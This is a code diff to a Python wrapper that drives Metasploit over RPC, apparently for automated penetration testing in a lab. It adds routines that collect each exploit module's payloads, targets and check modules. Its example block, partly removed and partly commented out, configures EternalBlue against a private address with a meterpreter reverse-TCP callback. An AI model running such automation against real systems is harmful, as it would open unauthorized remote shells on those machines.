@@ -52,8 +52,6 @@ class Msfrpc:
         # infos related to common parameters
         self.service_rpc_password = str(config['Common']['msgrpc_pass'])
         self.service_rpc_port = str(config['Common']['server_port'])
-        self.save_path_ia_data = str(config['Common']['save_path'])
-        self.save_ia_data_file = str(config['Common']['save_file'])
 
         # stored parameters
         self.client = None
@@ -62,6 +60,8 @@ class Msfrpc:
         self.list_of_auxiliaries = None
         self.list_of_payloads = None
         self.default_list_payload_per_exploit = None
+        self.checkmodule_list_per_exploit = None
+        self.targets_list_per_exploit = None
         # current chosen values
         self.current_exploit = None
         self.current_auxiliary = None
@@ -139,30 +139,212 @@ class Msfrpc:
         default_payload_dictionary = {}
         loading_iteration = 0
 
-        try:
+        for exploit in self.list_of_exploit:
 
-            for exploit in self.list_of_exploit:
+            try:
+
                 self.run_an_exploit(exploit)
-                list_of_payloads = self.current_exploit.targetpayloads()
+                list_of_payloads = self.current_exploit.payloads
                 for payload in self.default_list_payload_sorted:
                     if payload in list_of_payloads:
                         loading_iteration += 1
                         print(
                             self.color_monitor.background_OKGREEN + "[*] {}/{} Retrieving default payload for exploit {} : {}".format(
                                 str(loading_iteration),
-                                str(len(self.list_of_exploit) + 1),
+                                str(len(self.list_of_exploit)),
                                 str(exploit), str(payload)) +
                             self.color_monitor.background_ENDC)
                         default_payload_dictionary[str(exploit)] = str(payload)
                         break
 
-            self.default_list_payload_per_exploit = default_payload_dictionary
+            except Exception as e:
+                print(
+                    self.color_monitor.background_FAIL + "[x] Failed to get default payload of the exploit {} : {}".format(
+                        str(exploit),
+                        str(e)),
+                    self.color_monitor.background_ENDC)
 
-        except Exception as e:
-            print(
-                self.color_monitor.background_FAIL + "[x] Failed to get default payload : {}".format(
-                    str(e)),
-                self.color_monitor.background_ENDC)
+        self.default_list_payload_per_exploit = default_payload_dictionary
+
+    def get_targets_exploit(self):
+        '''
+        Method used to get the targets
+        :return: dictionnary of the targets
+        '''
+
+        checkmodule_exploit_dictonnary = {}
+        loading_iteration = 0
+        list_of_targets = []
+        tmp = []
+        flag_check = None
+
+        for exploit in self.list_of_exploit:
+
+            try:
+
+                ######################                          #######################
+                ######################USE EXPLOIT IN THE CONSOLE#######################
+                for i in range(5):
+                    console_data = self.execute_console_command('use ' + str(exploit))
+                    ####CHECK IF CONSOLE DID THE EXPECTED BEHAVIOR####
+                    if str("msf6 exploit(" + exploit + ")") in console_data['prompt']:
+                        flag_check = True
+                        break
+                    ##################################################
+                if flag_check is None:
+                    raise Exception(
+                        "Console does not work properly, exploit cannot be used, please relaunch it or debug")
+                ####RESET FLAG CHECK####
+                flag_check = None
+                ########################
+
+                ######################                    #############################
+                ######################SHOW TARGETS COMMAND#############################
+                for i in range(5):
+                    console_data = self.execute_console_command('show targets')
+                    ####CHECK IF CONSOLE DID THE EXPECTED BEHAVIOR####
+                    if str("Id") in console_data['data']:
+                        flag_check = True
+                        break
+                    ##################################################
+                if flag_check is None:
+                    raise Exception(
+                        "Console does not work properly, targets cannot be seen, please relaunch it or debug")
+                ####RESET FLAG CHECK####
+                flag_check = None
+                ########################
+
+                ####################                   ###############################
+                ####################EXTRACT THE TARGETS###############################
+                list_of_targets = console_data['data']
+                list_of_targets = list_of_targets.split('\n')
+                ####CLEAR THE NOISY DATA IN THE LIST
+                for i in range(len(list_of_targets) + 1):
+                    try:
+                        list_of_targets.remove('')
+                    except:
+                        break
+
+                ####SUPPRESS THE USELESS HEADER
+                list_of_targets = list_of_targets[3:]
+
+                ####FOR EACH ITEM OF THE LIST, RETRIEVE ONLY THE NAME OF THE TARGET
+                for item in list_of_targets:
+                    sub_list_of_targets = item.split('  ')
+                    tmp.append(sub_list_of_targets[-1])
+
+                ####FINALLY STORE THE DATA
+                loading_iteration += 1
+                print(
+                    self.color_monitor.background_OKGREEN + "[*] {}/{} Retrieving targets option for exploit {} ".format(
+                        str(loading_iteration),
+                        str(len(self.list_of_exploit)),
+                        str(exploit)),
+                    self.color_monitor.background_ENDC
+                )
+                checkmodule_exploit_dictonnary[str(exploit)] = tmp
+                tmp = []
+
+            except Exception as e:
+                print(
+                    self.color_monitor.background_FAIL + "[x] Failed to get targets option of the exploit {} : {}".format(
+                        str(exploit),
+                        str(e)),
+                    self.color_monitor.background_ENDC)
+
+        self.checkmodule_list_per_exploit = checkmodule_exploit_dictonnary
+
+    def get_checkmodule_exploit(self):
+        '''
+        Method used to get the targets
+        :return: dictionnary of the targets
+        '''
+        # TODO badly shape, reforge it
+        checkmodule_exploit_dictonnary = {}
+        loading_iteration = 0
+        list_of_checkmodule = []
+        checkmodule = ''
+        flag_check = None
+
+        for exploit in self.list_of_exploit:
+
+            try:
+
+                ######################                          #######################
+                ######################USE EXPLOIT IN THE CONSOLE#######################
+                for i in range(5):
+                    console_data = self.execute_console_command('use ' + str(exploit))
+                    ####CHECK IF CONSOLE DID THE EXPECTED BEHAVIOR####
+                    if str("msf6 exploit(" + exploit + ")") in console_data['prompt']:
+                        flag_check = True
+                        break
+                    ##################################################
+                if flag_check is None:
+                    raise Exception(
+                        "Console does not work properly, exploit cannot be used, please relaunch it or debug")
+                ####RESET FLAG CHECK####
+                flag_check = None
+                ########################
+
+                ######################                    #############################
+                ######################SHOW TARGETS COMMAND#############################
+                for i in range(2):
+                    console_data = self.execute_console_command('show advanced')
+                    ####CHECK IF CHECKMODULE IS IN THE CONSOLE DATA####
+                    if str("CheckModule") in console_data['data']:
+                        flag_check = True
+                        break
+                    ##################################################
+                if flag_check is None:
+                    loading_iteration += 1
+                    raise Exception(
+                        "Console mights not work properly, checkmodule cannot be seen or mights not exist for this exploit")
+                ####RESET FLAG CHECK####
+                flag_check = None
+                ########################
+
+                ####################                   ###############################
+                ####################EXTRACT THE TARGETS###############################
+                list_of_checkmodule = console_data['data']
+                list_of_checkmodule = list_of_checkmodule.split('\n')
+                ####CLEAR THE NOISY DATA IN THE LIST
+                for i in range(len(list_of_checkmodule) + 1):
+                    try:
+                        list_of_checkmodule.remove('')
+                    except:
+                        break
+
+                ####SUPPRESS THE USELESS HEADER
+                list_of_checkmodule = list_of_checkmodule[3:]
+
+                ####FOR EACH ITEM OF THE LIST, LOOK IF CHECKMODULE IS IN THE LIST
+                for item in list_of_checkmodule:
+                    if 'checkmodule' in item.lower():
+                        checkmodule = list_of_checkmodule[list_of_checkmodule.index(item) + 1].split(' ')[-1] + list_of_checkmodule[list_of_checkmodule.index(item) + 2].split(' ')[-1]
+                        checkmodule = 'auxiliary/scanner' + checkmodule
+
+                ####FINALLY STORE THE DATA
+                loading_iteration += 1
+                print(
+                    self.color_monitor.background_OKGREEN + "[*] {}/{} Retrieving checkmodule option for exploit {} ".format(
+                        str(loading_iteration),
+                        str(len(self.list_of_exploit)),
+                        str(exploit)),
+                    self.color_monitor.background_ENDC
+                )
+                checkmodule_exploit_dictonnary[str(exploit)] = checkmodule
+                checkmodule = ''
+
+            except Exception as e:
+                print(
+                    self.color_monitor.background_FAIL + "[x] {}/{} Failed to get checkmodule option of the exploit {} : {}".format(
+                        str(loading_iteration),
+                        str(len(self.list_of_exploit)),
+                        str(exploit),
+                        str(e)),
+                    self.color_monitor.background_ENDC)
+
+        self.checkmodule_list_per_exploit = checkmodule_exploit_dictonnary
 
     def run_an_exploit(self, chosen_exploit):
         '''
@@ -307,21 +489,28 @@ class Msfrpc:
         '''
         json_exploit = self.current_exploit.execute(payload=self.current_payload)
         session = -1
-        time.sleep(15)  # wait cause of the latency of the execution of an exploit
+        session_id = None
         try:
+            if json_exploit['job_id'] is None:
+                raise Exception("Bad configuration of exploit")
+
+            time.sleep(15)  # wait cause of the latency of the execution of an exploit
+
             session_num_list = [*self.client.sessions.list]
-            session_id = session_num_list[-1]
+            for session_buffer_num in session_num_list:
+                if self.client.sessions.list[str(session_buffer_num)]['via_exploit'] == str(self.current_exploit.fullname):
+                    session_id = session_buffer_num
             session = self.client.sessions.session(str(session_id))
             print(self.color_monitor.background_OKGREEN + "[*] Successfull execution of the exploit" +
                   self.color_monitor.background_ENDC)
         except Exception as e:
-            print(self.color_monitor.background_FAIL + "[x] Failed to execute exploit : {}".format(str(e)),
+            print(self.color_monitor.background_FAIL + "[x] Failed to execute exploit : {}".format(str(self.current_exploit.fullname)),
                   self.color_monitor.background_ENDC)
 
         if session == -1:
             return -1, -1
         elif len(self.client.sessions.list) == 0:
-            print(self.color_monitor.background_FAIL + "[x] Failed to get a session : {}".format(str(e)),
+            print(self.color_monitor.background_FAIL + "[x] Failed to get a session : {}".format(str(self.current_exploit.fullname)),
                   self.color_monitor.background_ENDC)
             print(
                 self.color_monitor.background_WARNING + "[!] Exploit or payload might not match or might be badly configured" +
@@ -385,6 +574,8 @@ class Msfrpc:
             print(self.color_monitor.background_FAIL + "[x] Failed to execute command : {}".format(str(e)),
                   self.color_monitor.background_ENDC)
         return output
+
+    # TODO change method db_retrieve
 
     def retrieve_exploit_from_db_info(self, list_of_rows):
         '''
@@ -496,12 +687,13 @@ if __name__ == '__main__':
     env.launch_metasploit()
     env.connection_rpc()
     env.get_exploits()
-    env.run_an_exploit('exploit/linux/misc/saltstack_salt_unauth_rce')
-    env.run_an_exploit('windows/smb/ms17_010_eternalblue')
-    options = env.change_option_exploit('CheckModule', 'auxiliary/scanner/smb/smb_ms17_010', 'STR')
-    options = env.change_option_exploit('RHOSTS', '172.16.1.2', 'STR')
-    env.run_a_payload('windows/x64/meterpreter/reverse_tcp')
-    env.change_option_payload('LHOST', '172.16.2.2', 'STR')
-    json, session = env.execute_exploit()
+    env.run_an_exploit('exploit/multi/misc/java_jmx_server')
+    # env.run_an_exploit('windows/smb/ms17_010_eternalblue')
+    # options = env.change_option_exploit('CheckModule', 'auxiliary/scanner/smb/smb_ms17_010', 'STR')
+    # options = env.change_option_exploit('RHOSTS', '172.16.1.2', 'STR')
+    # env.run_a_payload('windows/x64/meterpreter/reverse_tcp')
+    # env.change_option_payload('LHOST', '172.16.2.2', 'STR')
+    # json, session = env.execute_exploit()
+    # print(env.client.sessions.list)
     while 1:
         a = None
